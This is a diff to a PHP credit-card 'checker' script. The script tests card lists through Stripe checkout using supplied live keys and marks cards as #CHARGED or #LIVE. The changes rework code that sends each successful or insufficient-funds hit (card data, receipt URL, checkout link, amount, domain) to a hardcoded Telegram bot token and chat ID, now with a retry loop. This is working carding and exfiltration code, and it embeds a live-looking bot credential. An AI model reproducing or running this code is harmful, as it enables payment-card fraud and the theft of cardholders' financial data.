@@ -51,7 +51,7 @@ if (strlen($ano) == 2) $ano = "20$ano";
 
 $pklive = $_GET['pklive'];
 $cslive = $_GET['cslive'];
-$colink = $_GET['colink'];
+$colink = urlencode($_GET['colink']);
 $xamount = $_GET['xamount'];
 $xemail = $_GET['xemail'];
 
@@ -305,16 +305,32 @@ if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
     $scheme = '';
 }
 
+#############SEND TO TG BOT WHEN CHARGED
+$botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
+$chatID = urlencode('-1001808253666');
+$charged_message = 'Successfull%20Checkout%0A%0ABIN:%0A'.$lista.'%0A%0AURL:%0A'.$success.'%0A%0AAmount:%0A'.strtoupper($currency).'%20'.($xamount / 100).'%0A%0AChecked%20from:%0A'.$domain.'';
+$sendcharged = 'https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $chatID . '&text='.$charged_message.'';
+
+#############SEND TO TG BOT WHEN INSUFFBAL
+$botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
+$chatID = urlencode('-1001808253666');
+$insuf_message = 'INSUFFICIENT%20FUNDS%0A%0ABIN:%0A'.$lista.'%0A%0AAmount%20to%20bill:%0A'.strtoupper($currency).'%20'.($xamount / 100).'%0A%0AStripe%20Checkout%20link:%0A'.$colink.'%0A%0AChecked%20from:%0A'.$domain.'';
+$sendinsuff = 'https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $chatID . '&text='.$insuf_message.'';
+
+#############BOT RETRY TO SEND IF ITS NOT WORKS
+$max_retries = 3;
+$num_retries = 0;
+$sendchargedtotg = false;
+$sendinsufftotg = false;
+
 
 #############SUCCEEDED SUCCESS
  if (strpos($result1, '"status": "succeeded"')) {
-    echo "<span class='badge badge-success'>#CHARGED</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: green;' class='badge'>The payment transaction has been successfully processed <a href='$success'>[ receipt here ]</a> -Alice Schuberg</span><br>";
-        $url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=Successfull Checkout%0A%0ABIN: '.$lista.'%0AURL: '.$success.'%0AAmount: '.strtoupper($currency).' '.($xamount / 100).'%0AChecked from:%0A'.$domain.'';
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_exec($ch);
-        curl_close($ch);
+    while (!$sendchargedtotg && $num_retries < $max_retries) {
+    $sendchargedtotg = @file_get_contents($sendcharged);
+    $num_retries++;
+}
+    echo "<span class='badge badge-success'>#CHARGED</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: green;' class='badge'>The payment transaction has been successfully processed <a href='$success'  target='_blank'>[ proof here ]</a> -Alice Schuberg</span><br>";
     exit();
 }
 #############DECLINECODEcurl0
@@ -336,13 +352,11 @@ elseif($tos == "required") {
     exit();
 }
 if (strpos($curl0, '"insufficient_funds"')) {
+    while (!$sendinsufftotg && $num_retries < $max_retries) {
+    $sendinsufftotg = @file_get_contents($sendinsuff);
+    $num_retries++;
+}
     echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span><br>";
-        $url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=INSUFFICIENT FUND%0A%0ABIN: '.$lista.'%0AAttempted to charge the amount for a total of '.strtoupper($currency).' '.($xamount / 100).'%0ACheckout link:%0A'.$colink.'%0AChecked from:%0A'.$domain.'';
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_exec($ch);
-        curl_close($ch);
     exit();
 }
 
@@ -376,13 +390,11 @@ elseif($tos == "required") {
     exit();
 }
 if (strpos($curl1, '"insufficient_funds"')) {
+    while (!$sendinsufftotg && $num_retries < $max_retries) {
+    $sendinsufftotg = @file_get_contents($sendinsuff);
+    $num_retries++;
+}
     echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span><br>";
-        $url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=INSUFFICIENT FUND%0A%0ABIN: '.$lista.'%0AAttempted to charge the amount for a total of '.strtoupper($currency).' '.($xamount / 100).'%0ACheckout link:%0A'.$colink.'%0AChecked from:%0A'.$domain.'';
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_exec($ch);
-        curl_close($ch);
     exit();
 }
 
@@ -412,13 +424,11 @@ elseif($tos == "required") {
     exit();
 }
 if (strpos($result1, '"insufficient_funds"')) {
+    while (!$sendinsufftotg && $num_retries < $max_retries) {
+    $sendinsufftotg = @file_get_contents($sendinsuff);
+    $num_retries++;
+}
     echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span><br>";
-        $url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=INSUFFICIENT FUND%0A%0ABIN: '.$lista.'%0AAttempted to charge the amount for a total of '.strtoupper($currency).' '.($xamount / 100).'%0ACheckout link:%0A'.$colink.'%0AChecked from:%0A'.$domain.'';
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_exec($ch);
-        curl_close($ch);
     exit();
 }
 
